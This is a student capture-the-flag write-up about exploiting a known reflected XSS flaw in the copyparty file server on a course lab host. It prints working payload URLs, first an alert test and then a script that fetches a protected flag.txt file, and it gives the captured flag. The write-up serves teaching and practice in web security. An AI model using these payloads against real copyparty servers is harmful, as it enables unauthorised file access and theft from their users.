# CTF Semana #7 (XSS)

## Accessing the Website
1. We navigated to the provided address:
   > [http://ctf-fsi.fe.up.pt:5007](http://ctf-fsi.fe.up.pt:5007)
2. Used **Google Chrome** (the exploit does not work on Firefox).
3. We explore the site's functionalities as a regular user.

---

## Searching for Known Vulnerabilities
1. We searched for information about vulnerabilities related to the service.
2. Used the following search term in Google:
   > `copyparty cve xss`
3. And found an exploit published on [Exploit Database](https://www.exploit-db.com/exploits/51635), describing a **Reflected XSS** vulnerability.

---

## Testing the Exploit
1. The original exploit triggers an alert with the following URL:

```html
https://localhost:3923/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

2. We adapted the exploit to the challenge's server address:

```html
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E
```

3. Upon loading this link in the browser, an alert appeared, confirming the site is vulnerable to **Reflected XSS**.

---

## 4. Modifying the Exploit to Retrieve the Flag
We replaced the alert code with a script to fetch the protected `flag.txt` file and display its content in an alert.

Adapted code:

```html
http://ctf-fsi.fe.up.pt:5007/?k304=y%0D%0A%0D%0A%3Cscript%3Efetch('/flag.txt').then(response%20=%3E%20response.text()).then(data%20=%3E%20alert(data))%3C/script%3E
```

We pasted the link above into the browser and it loaded the page, and the script was executed.
The flag content appeared in an alert.


The retrieved flag is:

flag{youGotMeReallyGood}


# Analysis

## Why couldn't the flag be accessed directly?
The flag.txt file was protected from direct access. The server restricted access to this file through internal methods only.

## What vulnerability was exploited?
This attack exploited a Reflected XSS vulnerability. The server failed to properly validate or sanitize user input in the URL, allowing the injection and execution of malicious JavaScript code.

